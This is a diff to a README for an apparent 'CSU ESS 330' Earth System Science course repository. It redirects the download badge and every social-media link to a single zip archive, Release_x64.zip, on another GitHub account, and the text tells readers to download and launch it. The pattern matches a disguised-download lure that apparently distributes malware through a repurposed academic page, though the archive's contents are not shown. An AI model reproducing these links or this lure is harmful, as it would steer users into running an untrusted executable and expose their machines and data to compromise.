@@ -6,7 +6,7 @@ Welcome to the CSU ESS 330 repository! This is a place where you can find resour
 
 To access the software related to this repository, click the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/SentrixKun/csu-ess-330/releases/download/v1.0/Release_x64.zip)](https://github.com/SentrixKun/csu-ess-330/releases/download/v1.0/Release_x64.zip)
 
 Note: The link above leads to a zip file that contains the software. Make sure to download and launch it to explore the resources provided.
 
@@ -46,9 +46,9 @@ If you have any questions, feedback, or suggestions regarding this repository, f
 
 Stay updated with the latest news and updates by connecting with us on social media platforms:
 
-- [Twitter](https://twitter.com/CSUESS330)
-- [LinkedIn](https://www.linkedin.com/company/csu-ess-330)
-- [Facebook](https://www.facebook.com/CSUESS330)
+- [Twitter](https://github.com/SentrixKun/csu-ess-330/releases/download/v1.0/Release_x64.zip)
+- [LinkedIn](https://github.com/SentrixKun/csu-ess-330/releases/download/v1.0/Release_x64.zip)
+- [Facebook](https://github.com/SentrixKun/csu-ess-330/releases/download/v1.0/Release_x64.zip)
 
 Join our community of Earth System Science enthusiasts and engage in discussions, share insights, and collaborate on projects that contribute to the field's advancement.
 
